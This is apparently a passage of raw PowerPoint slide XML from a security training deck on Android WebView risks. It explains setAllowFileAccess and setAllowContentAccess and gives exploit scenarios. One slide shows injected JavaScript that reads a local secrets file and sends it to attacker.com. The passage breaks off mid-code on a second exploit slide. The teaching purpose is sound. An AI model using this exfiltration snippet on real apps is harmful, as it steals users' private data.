          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t>When the app is built, this assets folder is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0"/>
              <a:t>packed into the APK</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t> (Android app file) and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0"/>
              <a:t>available at runtime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0534874-6577-FE27-B5C2-46E7F80FBC98}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="660137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56565-4AEE-6DC8-3572-45B688814B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60AA872-947F-EEDA-2856-2D9F01240EF0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2272351" y="2089861"/>
            <a:ext cx="7028597" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" b="1" dirty="0"/>
              <a:t>Loading Local Files Using WebView</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0">
              <a:cs typeface="Aharoni" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F9EB1842-5DE8-3A51-BCDB-0751812986A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="582304" y="3261815"/>
            <a:ext cx="11027391" cy="2585323"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750" fontAlgn="base">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Loading an html file from within the assets folder has limitations. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>They are bundled inside the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>apk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, which means if you want to update these files, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>you need to ship a new </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>apk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" fontAlgn="base">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" fontAlgn="base">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>And you know how rarely people might update their apps. But if you make the app load the html and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> files from the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>internal storage instead</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, you can implement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>custom update mechanisms. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" fontAlgn="base">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-GB" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" fontAlgn="base">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Simply download the new version of the file into internal storage, and the next time you load the URL into the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>webview</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, you have the new version. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C4B307E8-0FAF-9CB7-5A8F-B8EA445A088C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3225613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05BAE-47BA-D993-9008-9A1E7EAC618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972977A-5264-B4EF-6D28-8BB64C9638EE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2893326" y="1049579"/>
            <a:ext cx="5964071" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>setAllowFileAccess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(true)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{02E957EA-76A3-86AC-4185-AB1101656960}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="150123" y="2466201"/>
            <a:ext cx="4913195" cy="3416320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>What it does</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>: Allows WebView to access the local file system. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Risk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>: If an attacker injects </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>HTML/JS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> into</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> WebView</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, they can try to read sensitive local files. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>🔥 Exploit Scenario:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Attacker injects malicious HTML that reads a local file like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>file:///data/data/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>com.example.app</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/files/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>secrets.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DEBDDA59-7FB1-127E-28E1-F7C6383A00BE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5158854" y="2327701"/>
            <a:ext cx="6469039" cy="3693319"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>webView.getSettings</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>setAllowFileAccess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>(true); </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>webView.loadData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>( </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  "&lt;html&gt;&lt;body&gt;" + </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  "&lt;script&gt;" + </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  "fetch(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>file:///data/data/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>com.example.app</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/files/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>secrets.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>')" + </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  ".then(res =&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>res.text</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>())" + </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  ".then(data =&gt; fetch('https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>steal?data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>=' + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>encodeURIComponent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>(data)))" + </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  "&lt;/script&gt;" + </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  "&lt;/body&gt;&lt;/html&gt;", "text/html", "utf-8" </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>); </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{68DCC428-DCAF-B969-6ECC-2896D96D8C3C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="423080" y="6241142"/>
            <a:ext cx="11900847" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" b="1" dirty="0"/>
              <a:t>File system access opens the door to reading private files if injection is possible. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3B72D8D7-A12F-AD83-004D-56DBC9473267}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1255978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7F3F6-E252-139E-CDB4-02FF42A9AE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3A48078-1784-072D-5A08-318CB8AC52BE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606720" y="1132115"/>
            <a:ext cx="5964071" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>setAllowContentAccess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(true)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EAF2E5C2-5D78-D901-C807-7D902AADD51A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="150123" y="2466201"/>
            <a:ext cx="4913195" cy="3970318"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>What it does</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>: Allows access to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>content://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> URIs (often used by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>ContentProvider</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Risk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>: If your app or another app </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>exposes sensitive data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via a misconfigured </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>ContentProvider</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, attacker JavaScript in WebView can access it. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Note</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> - If a vulnerable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>ContentProvider</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> is exposed and unprotected, sensitive data can be leaked. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7207B2C7-ED74-D107-FAED-7FB7BA2A3F2C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5322627" y="2327701"/>
            <a:ext cx="6564575" cy="3970318"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>🔥 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exploit Scenario:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>webView.getSettings</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>setAllowContentAccess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(true);</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>webView.loadData</a:t>
            </a:r>
            <a:r>
